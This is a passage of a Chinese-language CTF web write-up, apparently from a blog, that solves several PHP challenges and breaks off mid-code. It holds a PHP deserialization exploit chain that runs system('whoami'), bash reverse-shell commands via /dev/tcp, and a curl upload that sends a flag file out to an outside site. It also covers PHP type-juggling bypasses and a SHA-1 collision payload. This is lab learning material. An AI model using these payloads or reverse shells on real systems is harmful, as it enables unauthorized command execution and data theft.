operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token keyword">extends</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$call</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">call</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can't do this :("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">d</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$call</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$call</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">b</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token keyword">extends</span> <span class="token class-name">b</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$call</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">call</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setB</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">d</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">c</span><span class="token punctuation">(</span>    <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">d</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"eval"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">d</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"eval"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setB</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"eval"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>执行流程：</p><pre><code>class a的test=new c(),调用c的test(),c继承于b,会先调d的test(),而b中的$b被设为[$c, &quot;eval&quot;],然后就会调用c的eval()函数，而$this-&gt;call=[new d(&quot;system&quot;), &quot;eval&quot;],$this-&gt;value=[new d(&quot;whoami&quot;), &quot;eval&quot;],然后($this-&gt;call)($this-&gt;value)就变成了([new d(&quot;system&quot;), &quot;eval&quot;])([new d(&quot;whoami&quot;), &quot;eval&quot;]);第一次进入到d中，d的$this-&gt;value=system,$call=[new d(&quot;whoami&quot;), &quot;eval&quot;];$call($this-&gt;value)就成了[new d(&quot;whoami&quot;), &quot;eval&quot;] (&quot;system&quot;)第二次进入d中,d的$this-&gt;value=whoami,$call=system,$call($this-&gt;value)就成了(&quot;system&quot;)(&quot;whoami&quot;)</code></pre><p>关于为啥<code>[$c, &quot;eval&quot;]</code>就能执行<code>c</code>的<code>eval</code>函数</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">aa</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"123"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$dd</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">aa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fun"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//输出 123      ["aa","fun"]()这样也可以</span></code></pre><p>还有就是<code>([new d(&quot;system&quot;), &quot;eval&quot;])([new d(&quot;whoami&quot;), &quot;eval&quot;])</code>这个，后面的<code>[new d(&quot;whoami&quot;), &quot;eval&quot;]</code>被当作eval的参数传进去了</p><p>看一个简单的</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">aa</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$c1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$qq</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">c1</span><span class="token operator">=</span><span class="token variable">$qq</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">bb</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$aadd</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"34"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$aadd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">aa</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">bb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fun"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"123"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>输出</p><pre><code>34array(1) &#123;[0]=&gt;string(3) &quot;123&quot;&#125;</code></pre><p>所以在一个数组中，<code>[new a(),&quot;fff&quot;]()</code>就相当于<code>new a()-&gt;ff()</code>,当然，后面的<code>()</code>里也可以加参数，如果需要的话</p><p><code>php是世界上最好的语言✔（￣︶￣）↗　</code></p><h2 id="where-is-my-FUMO"><a href="#where-is-my-FUMO" class="headerlink" title="where_is_my_FUMO"></a>where_is_my_FUMO</h2><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">chijou_kega_no_junnka</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$black_list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">">"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">";"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"|"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"&#123;"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"&#125;"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"/"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">" "</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$black_list</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'DATA'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'DATA'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token function">chijou_kega_no_junnka</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token function">chijou_kega_no_junnka</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PORT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"bash -c \"bash -i &lt; /dev/tcp/<span class="token interpolation"><span class="token variable">$addr</span></span>/<span class="token interpolation"><span class="token variable">$port</span></span>\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>反弹shell，但是是个无回显的shell,可以无回显shell中执行反弹shell命令，再次反弹到VPS的另一个端口</p><p><code>bash -i &gt;&amp; /dev/tcp/IP/2233 0&gt;&amp;1</code></p><p>flag在<code>/flag.png</code>中</p><p>可以这样<code>curl bashupload.com -T /flag.png</code> </p><p><code>bashupload.com</code>是一个用来传输服务器文件的网站</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111301202589.png"><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111301203952.png"></p><p>下载即可</p><ul><li>第二种方法<br>传到自己的服务器上<br><code>cat /flag.png &gt;&amp; /dev/tcp/IP/2233 0&gt;&amp;1</code></li></ul><p><code>nc -lvnp 2233 &gt; /var/flag.png</code></p><h2 id="Baby-PHP-Black-Magic-Enlightenment"><a href="#Baby-PHP-Black-Magic-Enlightenment" class="headerlink" title="Baby_PHP_Black_Magic_Enlightenment"></a>Baby_PHP_Black_Magic_Enlightenment</h2><p>第一关：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token double-quoted-string string">"PHP is the best Language &lt;br/>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Have you ever heard about PHP Black Magic&lt;br/>"</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no way"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token operator">></span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"How's that possible"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Art is long, but life is short. So I use PHP.</span><span class="token comment">//I think It`s So useful that DiaoRen Said;</span><span class="token comment">//why not they use their vps !!!</span><span class="token comment">//BBTZ le jiarenmen</span><span class="token delimiter important">?></span></code></pre><p><code>/?password=10000a</code></p><p>第二关：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'no no no no way for you to do so.'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'G1ve u the flag'</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'not right'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Just g1ve it a try.'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>/baby_magic.php?user[]=1&amp;pass[]=2</code><br>第三关：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'fllag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'no no no no way for you to do so.'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'There is no way you can sneak me, young man!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Hanzo:It is impossible only the tribe of Shimada can controle the dragon&lt;br/>"</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Genji:We will see again Hanzo'</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;br/>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Wrong!'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Just G1ve it a try.'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><p>sha1哈希碰撞</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestrotimi <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://shattered.io/static/shattered-1.pdf"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span>letmein <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://shattered.io/static/shattered-2.pdf"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://tc.rigelx.top:8003/baby_revenge.php'</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'user'</span><span class="token punctuation">:</span> rotimi<span class="token punctuation">,</span> <span class="token string">'pass'</span><span class="token punctuation">:</span> letmein<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment">#来自：https://www.linkedin.com/pulse/using-sha1-collision-attack-solve-bostonkeyparty-ctf-rotimi</span></code></pre><p>或者：<br>    ?user=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p><pre><code>&amp;pass=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</code></pre><p>第四关：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flllllllllag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Longlone"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token 